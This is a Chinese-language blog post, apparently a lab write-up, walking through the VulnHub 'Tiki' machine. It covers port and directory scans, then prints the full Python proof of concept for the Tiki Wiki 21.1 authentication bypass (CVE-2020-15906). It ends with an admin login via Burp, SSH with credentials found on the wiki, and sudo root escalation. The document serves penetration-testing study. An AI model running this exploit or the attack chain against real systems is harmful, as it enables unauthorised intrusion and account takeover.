@@ -1,0 +1,164 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta property="og:site_name" content="My Blog"><meta property="og:type" content="article"><meta property="og:image" content="https://www.princesses.cc//img/home-bg-jeep.jpg"><meta property="twitter:image" content="https://www.princesses.cc//img/home-bg-jeep.jpg"><meta name=title content="Tiki靶机(CMS漏洞)靶机提权"><meta property="og:title" content="Tiki靶机(CMS漏洞)靶机提权"><meta property="twitter:title" content="Tiki靶机(CMS漏洞)靶机提权"><meta name=description content><meta property="og:description" content><meta property="twitter:description" content><meta property="twitter:card" content="summary"><meta name=keyword content><link rel="shortcut icon" href=/img/favicon.ico><title>Tiki靶机(CMS漏洞)靶机提权 | 帅蛋的博客</title>
+<link rel=canonical href=/post/2024-02-02-tiki%E9%9D%B6%E6%9C%BAcms%E6%BC%8F%E6%B4%9E/tiki%E9%9D%B6%E6%9C%BAcms%E6%BC%8F%E6%B4%9E/><link rel=stylesheet href=/css/bootstrap.min.css><link rel=stylesheet href=/css/hugo-theme-cleanwhite.min.css><link rel=stylesheet href=/css/zanshang.css><link href=https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css rel=stylesheet type=text/css><script src=/js/jquery.min.js></script><script src=/js/bootstrap.min.js></script><script src=/js/hux-blog.min.js></script><script src=/js/lazysizes.min.js></script></head><nav class="navbar navbar-default navbar-custom navbar-fixed-top"><div class=container-fluid><div class="navbar-header page-scroll"><button type=button class=navbar-toggle>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class=navbar-brand href=/>My Blog</a></div><div id=huxblog_navbar><div class=navbar-collapse><ul class="nav navbar-nav navbar-right"><li><a href=/>All Posts</a></li><li><a href=/archive/>档案</a></li><li><a href=/notes/>笔记</a></li><li><a href=/about/>关于</a></li><li><a href=/search><i class="fa fa-search"></i></a></li></ul></div></div></div></nav><script>var $body=document.body,$toggle=document.querySelector(".navbar-toggle"),$navbar=document.querySelector("#huxblog_navbar"),$collapse=document.querySelector(".navbar-collapse");$toggle.addEventListener("click",handleMagic);function handleMagic(){$navbar.className.indexOf("in")>0?($navbar.className=" ",setTimeout(function(){$navbar.className.indexOf("in")<0&&($collapse.style.height="0px")},400)):($collapse.style.height="auto",$navbar.className+=" in")}</script><style type=text/css>header.intro-header{background-image:url(/img/home-bg-o.jpg)}</style><header class=intro-header><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><div class=tags></div><h1>Tiki靶机(CMS漏洞)靶机提权</h1><h2 class=subheading>难度 : 简单</h2><span class=meta>Posted by
+帅蛋
+on
+Friday, February 2, 2024</span></div></div></div></div></header><article><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2
+col-md-10 col-md-offset-1
+post-container"><blockquote><p>“用代码表达言语的魅力，用代码书写山河的壮丽 . ”</p></blockquote><h4 id=目标信息>目标信息</h4><p><strong>描述:</strong>
+难度等级 : 简单</p><pre tabindex=0><code>	Description
+	描述：
+Oh no our webserver got compromised. The attacker used an 0day, so we dont know how he got into the admin panel. Investigate that.
+哦不，我们的Web服务器被入侵了。攻击者使用了一个0 day漏洞，所以我们不知道他是如何进入管理面板的。请调查一下。
+
+This is an OSCP Prep Box, its based on a CVE I recently found. Its on the OSCP lab machines level.
+这是一个OSCP预备盒（Prep Box），它基于我最近发现的一个CVE。它的难度与OSCP实验室机器相当
+
+If you need hints contact me on Twitter: S1lky_1337, should work on VirtualBox and Vmware.
+</code></pre><p><strong>前期准备:</strong>
+靶机地址：<a href=https://www.vulnhub.com/entry/tiki-1,525/>https://www.vulnhub.com/entry/tiki-1,525/</a></p><p>kali攻击机ip：192.168.0.105
+靶机ip：192.168.0.100</p><h2 id=1扫描端口以及ip>1）扫描端口以及ip</h2><p>首先对当前网段进行一个快速扫描</p><pre tabindex=0><code>sudo arp-scan 192.168.0.0/24
+	mac地址做一个比对
+	192.168.0.100
+</code></pre><p><img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240210235716.png alt=image.png|425>
+详细扫描</p><pre tabindex=0><code>nmap -A -p- -sC -T4 192.168.0.100 -oN nmap.A
+</code></pre><p><img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211000141.png alt=image.png|450>
+扫描结果：</p><ol><li><strong>开放端口和服务：</strong><ul><li>22/tcp：开放的SSH端口，正在运行OpenSSH 8.2p1，该服务在Ubuntu Linux上运行。</li><li>80/tcp：开放的HTTP端口，正在运行Apache httpd 2.4.41，该服务在Ubuntu上运行。默认页面显示Apache2 Ubuntu Default Page。</li><li>139/tcp和445/tcp：开放的NetBIOS-SSN端口，运行Samba smbd 4.6.2。</li></ul></li><li><strong>SSH信息：</strong><ul><li>SSH服务版本为OpenSSH 8.2p1 Ubuntu 4ubuntu0.1，使用RSA、ECDSA和ED25519密钥。</li></ul></li><li><strong>HTTP信息：</strong><ul><li>Apache httpd版本为2.4.41（Ubuntu）。默认页面显示Apache2 Ubuntu Default Page，同时存在一个robots.txt文件，其中有一个被禁止访问的目录 /tiki/。</li></ul></li><li><strong>Samba信息：</strong><ul><li>Samba服务版本为4.6.2，存在两个开放的NetBIOS-SSN端口（139/tcp和445/tcp）。</li></ul></li><li><strong>其他信息：</strong><ul><li>操作系统为Linux，内核版本未具体指定。</li></ul></li></ol><h4 id=网站首页>网站首页</h4><p><code>192.168.0.100</code>
+<img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211000242.png alt=image.png|475></p><h2 id=2扫描敏感目录>2）扫描敏感目录</h2><pre tabindex=0><code>sudo dirb http://192.168.0.100/
+</code></pre><p><img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211001014.png alt=image.png|450></p><p>访问：<code>http://192.168.0.100/robots.txt</code>
+<img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211001140.png alt=image.png>
+可以发现里面有一个 /tiki/目录</p><p>访问：<code>http://192.168.0.100/tiki/</code>
+博主给他翻译成中文了
+<img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211001636.png alt=image.png>
+发现CMS是<code>Tiki Wiki CMS</code>，但是没发现是什么版本
+<strong>Tiki Wiki CMS：</strong></p><ul><li>Tiki Wiki CMS是一种开源的内容管理系统（CMS）和协作平台，用于构建和管理网站、博客和其他在线应用。</li><li>可以通过访问网站的<code>/tiki/</code>路径来尝试访问<code>Tiki Wiki CMS</code>的管理界面。</li></ul><p>我们在对<code>http://192.168.0.100/tiki/</code>进行敏感目录扫描，看能不能找到是什么版本的框架</p><pre tabindex=0><code>dirsearch -u http://192.168.0.100/tiki
+</code></pre><p><img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211003643.png alt=image.png|450>
+访问：<code>http://192.168.0.100/tiki/changelog.txt</code>
+<img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211003743.png alt=image.png|475>
+可以看到当前的版本为<code>21.1</code></p><h2 id=3漏洞利用>3）漏洞利用</h2><p>结合上面我们知道了<code>Tiki Wiki CMS</code>的版本为<code>21.1</code>
+使用<code>searchsploit</code>去搜索<code>Tiki Wiki CMS</code>的版本的漏洞</p><pre tabindex=0><code>sudo searchsploit Tiki Wiki CMS 21.1  
+</code></pre><p><img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211004332.png alt=image.png|475>
+将这个.py脚本文件下载到当前目录</p><pre tabindex=0><code>sudo searchsploit -m 48927.py   
+</code></pre><p><img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211004528.png alt=image.png|475>
+查看脚本内容
+<code>cat 48927.py</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#6272a4># Exploit Title: Tiki Wiki CMS Groupware 21.1 - Authentication Bypass</span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># Date: 01.08.2020 (1st August 2020)</span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># Exploit Author: Maximilian Barz aka. Silky</span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># Vendor Homepage: tiki.org</span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># Software Link: https://jztkft.dl.sourceforge.net/project/tikiwiki/Tiki_21.x_UY_Scuti/21.1/tiki-21.1.zip</span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># Version: 21.1</span>
+</span></span><span style=display:flex><span><span style=color:#6272a4># Tested on: Kali Linux 5.7.0-kali1-amd64</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#6272a4>#!/usr/bin/env/python3</span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> json
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> lxml.html
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>banner <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>████████ ██ ██   ██ ██ ██     ██ ██ ██   ██ ██     ██████   ██    ██ 
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>   ██    ██ ██  ██  ██ ██     ██ ██ ██  ██  ██          ██ ███   ███ 
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>   ██    ██ █████   ██ ██  █  ██ ██ █████   ██      █████   ██    ██ 
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>   ██    ██ ██  ██  ██ ██ ███ ██ ██ ██  ██  ██     ██       ██    ██ 
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>   ██    ██ ██   ██ ██  ███ ███  ██ ██   ██ ██     ███████  ██ ██ ██ 
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                                                                     
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c> █████  ██    ██ ████████ ██   ██ ███████ ███    ██ ████████ ██  ██████  █████  ████████ ██  ██████  ███    ██         ██████  ██    ██ ██████   █████  ███████ ███████ 
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>██   ██ ██    ██    ██    ██   ██ ██      ████   ██    ██    ██ ██      ██   ██    ██    ██ ██    ██ ████   ██         ██   ██  ██  ██  ██   ██ ██   ██ ██      ██      
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>███████ ██    ██    ██    ███████ █████   ██ ██  ██    ██    ██ ██      ███████    ██    ██ ██    ██ ██ ██  ██         ██████    ████   ██████  ███████ ███████ ███████ 
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>██   ██ ██    ██    ██    ██   ██ ██      ██  ██ ██    ██    ██ ██      ██   ██    ██    ██ ██    ██ ██  ██ ██         ██   ██    ██    ██      ██   ██      ██      ██ 
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>██   ██  ██████     ██    ██   ██ ███████ ██   ████    ██    ██  ██████ ██   ██    ██    ██  ██████  ██   ████         ██████     ██    ██      ██   ██ ███████ ███████ 
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>                                                                                                                                                                        
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>Poof of Concept for CVE-2020-15906 by Maximilian Barz, Twitter: S1lky_1337
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>def</span> <span style=color:#50fa7b>main</span>():
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span>(<span style=color:#8be9fd;font-style:italic>len</span>(sys<span style=color:#ff79c6>.</span>argv) <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>2</span>):
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(banner)
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;Usage: </span><span style=color:#f1fa8c>%s</span><span style=color:#f1fa8c> &lt;host&gt; &#34;</span> <span style=color:#ff79c6>%</span> sys<span style=color:#ff79c6>.</span>argv[<span style=color:#bd93f9>0</span>])
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;Eg:    </span><span style=color:#f1fa8c>%s</span><span style=color:#f1fa8c> 1.2.3.4 &#34;</span> <span style=color:#ff79c6>%</span> sys<span style=color:#ff79c6>.</span>argv[<span style=color:#bd93f9>0</span>])
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    rhost <span style=color:#ff79c6>=</span> sys<span style=color:#ff79c6>.</span>argv[<span style=color:#bd93f9>1</span>]
+</span></span><span style=display:flex><span>    url <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;http://&#34;</span><span style=color:#ff79c6>+</span>rhost<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#34;/tiki/tiki-login.php&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    session <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>Session()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_ticket</span>():
+</span></span><span style=display:flex><span>        r <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>get(url)
+</span></span><span style=display:flex><span>        login_page <span style=color:#ff79c6>=</span> r<span style=color:#ff79c6>.</span>text<span style=color:#ff79c6>.</span>encode(<span style=color:#f1fa8c>&#39;utf-8&#39;</span>)
+</span></span><span style=display:flex><span>        html <span style=color:#ff79c6>=</span> lxml<span style=color:#ff79c6>.</span>html<span style=color:#ff79c6>.</span>fromstring(login_page)
+</span></span><span style=display:flex><span>        auth <span style=color:#ff79c6>=</span> html<span style=color:#ff79c6>.</span>xpath(<span style=color:#f1fa8c>&#39;//input[@name=&#34;ticket&#34;]/@value&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#8be9fd;font-style:italic>str</span>(auth)[<span style=color:#bd93f9>2</span>:<span style=color:#ff79c6>-</span><span style=color:#bd93f9>2</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_cookie</span>():
+</span></span><span style=display:flex><span>        session<span style=color:#ff79c6>.</span>get(url)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> session<span style=color:#ff79c6>.</span>cookies<span style=color:#ff79c6>.</span>get_dict()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    cookie <span style=color:#ff79c6>=</span> get_cookie()
+</span></span><span style=display:flex><span>    ticket <span style=color:#ff79c6>=</span> get_ticket()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    payload <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#39;ticket&#39;</span>: ticket,<span style=color:#f1fa8c>&#39;user&#39;</span>:<span style=color:#f1fa8c>&#39;admin&#39;</span>, <span style=color:#f1fa8c>&#39;pass&#39;</span>:<span style=color:#f1fa8c>&#39;test&#39;</span>,<span style=color:#f1fa8c>&#39;login&#39;</span>:<span style=color:#f1fa8c>&#39;&#39;</span>,<span style=color:#f1fa8c>&#39;stay_in_ssl_mode_present&#39;</span>:<span style=color:#f1fa8c>&#39;y&#39;</span>,<span style=color:#f1fa8c>&#39;stay_in_ssl_mode&#39;</span>:<span style=color:#f1fa8c>&#39;n&#39;</span>}
+</span></span><span style=display:flex><span>    headers <span style=color:#ff79c6>=</span> {
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;Host&#39;</span>: rhost,
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;User-Agent&#39;</span>: <span style=color:#f1fa8c>&#39;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;Accept&#39;</span>: <span style=color:#f1fa8c>&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;Accept-Language&#39;</span>: <span style=color:#f1fa8c>&#39;en-US,en;q=0.5&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;Accept-Encoding&#39;</span>: <span style=color:#f1fa8c>&#39;gzrhost, deflate&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;Referer&#39;</span>: <span style=color:#f1fa8c>&#39;http://&#39;</span><span style=color:#ff79c6>+</span>rhost<span style=color:#ff79c6>+</span><span style=color:#f1fa8c>&#39;/tiki/tiki-login.php&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;Content-Type&#39;</span>: <span style=color:#f1fa8c>&#39;application/x-www-form-urlencoded&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;Content-Length&#39;</span>: <span style=color:#f1fa8c>&#39;125&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;Connection&#39;</span>: <span style=color:#f1fa8c>&#39;close&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;Upgrade-Insecure-Requests&#39;</span>: <span style=color:#f1fa8c>&#39;1&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#f1fa8c>&#39;Cache-Control&#39;</span>: <span style=color:#f1fa8c>&#39;max-age=0&#39;</span>,
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>60</span>):
+</span></span><span style=display:flex><span>        r <span style=color:#ff79c6>=</span> session<span style=color:#ff79c6>.</span>post(url, payload, headers)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span>(<span style=color:#f1fa8c>&#34;Account requires administrator approval.&#34;</span> <span style=color:#ff79c6>in</span> r<span style=color:#ff79c6>.</span>text):
+</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;Admin Password got removed.&#34;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;Use BurpSuite to login into admin without a password &#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>if</span>(__name__ <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;__main__&#39;</span>):
+</span></span><span style=display:flex><span>    main()  
+</span></span></code></pre></div><p>我这里也是问了一下AI,它直接告诉我使用方法了</p><p>这是一个漏洞利用脚本，用于利用Tiki Wiki CMS Groupware 21.1版本的身份验证绕过漏洞（CVE-2020-15906）。这个漏洞使得攻击者可以在不知晓管理员密码的情况下登录为管理员。
+该脚本使用Python 3，并使用了<code>requests</code>和<code>lxml</code>库。下面是脚本的主要功能和用法：</p><ol><li>从目标地址获取登录页，并解析HTML以获取认证令牌（ticket）。</li><li>发送POST请求模拟管理员的登录尝试，绕过密码验证，将用户登录为管理员。</li><li>如果成功，脚本将输出消息指示管理员密码已被移除，并建议使用BurpSuite工具登录为管理员而无需密码。
+使用方法：
+<code>python3 script_name.py target_ip</code>
+其中 <code>script_name.py</code> 是脚本文件的名称，<code>target_ip</code> 是目标IP地址。</li></ol><p><strong>使用漏洞</strong></p><pre tabindex=0><code>sudo python3 48927.py 192.168.0.100    
+</code></pre><p><img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211005512.png alt=image.png|450>
+提示用 burp 用<code>admin</code>登陆 去掉密码，就可以登陆<br>用 burp 抓包、改包，转发数据包、</p><p>打开 <code>burp</code> 进行抓包
+<img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211010350.png alt=image.png|475></p><p>成功登陆<code>admin</code>账号
+<img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211010438.png alt=image.png|475></p><p>继续信息收集，查看目录，发现 <code>wiki</code> 下的 <code>List Pages</code> 中有几个页面
+在<code>Credentials</code>页面发现了</p><pre tabindex=0><code>silky : Agy8Y7SPJNXQzqA
+</code></pre><p><img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211011652.png alt=image.png|425>
+类似账户密码</p><h2 id=4尝试ssh登陆>4）尝试ssh登陆</h2><pre tabindex=0><code>ssh silky@192.168.0.100
+</code></pre><p>登陆成功
+<img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211011909.png alt=image.png|500></p><h2 id=5提权>5）提权</h2><pre tabindex=0><code>sudo -l
+</code></pre><p>sudo组下的所有用户都能使用sudo权限，且免密码
+<img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211012030.png alt=image.png|500></p><p>切换至<code>root</code>用户下，成功得到<code>flag</code>
+<img src=/Tiki%e9%9d%b6%e6%9c%ba%28CMS%e6%bc%8f%e6%b4%9e%29.assets/20240211012314.png alt=image.png|500></p><h2 id=靶机渗透总结>靶机渗透总结：</h2><p>通过信息收集和工具测试，找出 Kiwi cms 漏洞，利用漏洞进入后台，再通过信息收集获取账户密码获取 ssh登陆，再利用 sudo 提权。</p><ol><li>信息收集</li><li>Tiki Wiki CMS 漏洞利用</li><li>sudo 提权</li></ol><hr><ul class=pager><li class=previous><a href=/post/2023-12-29-dc1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/dc1/ data-toggle=tooltip data-placement=top title=B2R_Dc1靶机提权>&larr;
+Previous Post</a></li></ul></div><div class="col-lg-2 col-lg-offset-0
+visible-lg-block
+sidebar-container
+catalog-container"><div class=side-catalog><hr class="hidden-sm hidden-xs"><h5><a class=catalog-toggle href=#>CATALOG</a></h5><ul class=catalog-body></ul></div></div><div class="col-lg-8 col-lg-offset-2
+col-md-10 col-md-offset-1
+sidebar-container"><section><hr class="hidden-sm hidden-xs"><h5><a href=/tags/>FEATURED TAGS</a></h5><div class=tags></div></section><section><hr><h5>FRIENDS</h5><ul class=list-inline><li><a target=_blank href=https://inecho.cc>Jia Lun的博客</a></li><li><a target=_blank href=https://inecho.cc>哈哈哈哈哈哈哈哈</a></li></ul></section></div></div></div></article><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center"><li><a href=mailto:shuaidan0@gmail.com><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=full%20profile%20url%20in%20twitter><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-twitter fa-stack-1x fa-inverse"></i></span></a></li><li><a target=_blank href=https://raw.githubusercontent.com/shuaidan0/blog-img/main/QR_code.jpg><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-weixin fa-stack-1x fa-inverse"></i></span></a></li><li><a target=_blank href=https://github.com/yourgithub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li><li><a target=_blank href=full%20profile%20url%20in%20instagram><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-instagram fa-stack-1x fa-inverse"></i></span></a></li><li><a href rel=alternate type=application/rss+xml title="My Blog"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-rss fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="copyright text-muted">Copyright &copy; My Blog 2024</p></div></div></div></footer><script>function loadAsync(e,t){var s=document,o="script",n=s.createElement(o),i=s.getElementsByTagName(o)[0];n.src=e,t&&n.addEventListener("load",function(e){t(null,e)},!1),i.parentNode.insertBefore(n,i)}</script><script>$("#tag_cloud").length!==0&&loadAsync("/js/jquery.tagcloud.js",function(){$.fn.tagcloud.defaults={color:{start:"#bbbbee",end:"#0085a1"}},$("#tag_cloud a").tagcloud()})</script><script>loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js",function(){var e=document.querySelector("nav");e&&FastClick.attach(e)})</script><script type=text/javascript>function generateCatalog(e){_containerSelector="div.post-container";var t,n,s,o,i,a=$(_containerSelector),r=a.find("h1,h2,h3,h4,h5,h6");return $(e).html(""),r.each(function(){t=$(this).prop("tagName").toLowerCase(),o="#"+$(this).prop("id"),n=$(this).text(),i=$('<a href="'+o+'" rel="nofollow">'+n+"</a>"),s=$('<li class="'+t+'_nav"></li>').append(i),$(e).append(s)}),!0}generateCatalog(".catalog-body"),$(".catalog-toggle").click(function(e){e.preventDefault(),$(".side-catalog").toggleClass("fold")}),loadAsync("/js/jquery.nav.js",function(){$(".catalog-body").onePageNav({currentClass:"active",changeHash:!1,easing:"swing",filter:"",scrollSpeed:700,scrollOffset:0,scrollThreshold:.2,begin:null,end:null,scrollChange:null,padding:80})})</script></body></html>
